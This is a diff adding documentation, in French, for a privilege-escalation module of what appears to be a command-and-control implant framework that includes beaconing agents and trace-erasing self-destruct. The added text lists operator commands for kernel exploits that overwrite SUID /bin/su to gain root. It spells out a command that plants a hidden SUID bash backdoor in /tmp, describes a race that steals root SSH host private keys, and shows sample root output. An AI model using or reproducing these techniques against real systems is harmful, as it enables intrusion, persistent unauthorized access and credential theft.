@@ -508,6 +508,33 @@ Modifie l'intervalle de beacon de l'agent à la volée, sans redémarrage.
 
 Prend effet dès le prochain cycle de sleep. Utile pour ralentir un agent une fois une tâche longue lancée, ou accélérer temporairement pour récupérer un résultat rapidement.
 
+#### `/module privesc [copyfail|dirtyfrag|ssh-keysign|fragnesia]`
+
+Lance un exploit de privilege escalation sur l'agent sélectionné.
+
+```
+/module privesc              # auto : essaie copyfail → dirtyfrag dans l'ordre, s'arrête au premier root
+/module privesc copyfail     # AF_ALG + KTLS splice overwrite /bin/su  (Python ≥ 3.10)
+/module privesc dirtyfrag    # xfrm/RxRPC page-cache write overwrite /usr/bin/su
+/module privesc ssh-keysign  # race pidfd_getfd sur sortie ssh-keysign → vole les clés SSH host
+/module privesc fragnesia    # setup namespace user+net (wrapper CVE-2026-46300, interactif)
+```
+
+**Mécanisme (copyfail / dirtyfrag)** : l'exploit écrase le binaire `/bin/su` ou `/usr/bin/su` (encore SUID root) avec un mini-ELF qui fait `setuid(0); setgid(0); execve("/bin/sh")`. Le TUI pipe ensuite `cp /bin/bash /tmp/.b<tag>; chmod +s /tmp/.b<tag>` dans ce su modifié pour planter une backdoor SUID bash persistante. Sur succès : `[privesc:ok] <exploit>` + sortie de `id` en root.
+
+```
+[privesc:ok] copyfail
+uid=0(root) gid=0(root) groupes=0(root)
+```
+
+**ssh-keysign** : lit `/etc/ssh/ssh_host_*_key` (clés privées root, mode 0600) en racant la fenêtre `pidfd_getfd` sur la sortie de `ssh-keysign`. Sortie directe dans le log. CVE patchée 2026-05-14 (kernel < `31e62c2ebbfd`).
+
+**fragnesia** : prépare uniquement un namespace user+net (`unshare --user --map-root-user --net`) — pas de root réel sur l'hôte. Interactif : utiliser avec `/module relay` pour accéder au shell namespace.
+
+> **Note NTP** : dirtyfrag pèse ~78 KB encodé — dépasse la limite UDP/123. Lancer `/module relay` avant `/module privesc dirtyfrag` sur un agent ClockVenom.
+> **Note copyfail** : requiert Python ≥ 3.10 sur la cible. Vérifié automatiquement en mode auto.
+> Root non requis pour lancer — l'exploit escalade depuis un user non-privilégié.
+
 #### `/module suicide`
 
 Auto-destruction de l'agent et effacement des traces sur la cible. Affiche une confirmation avant d'envoyer.
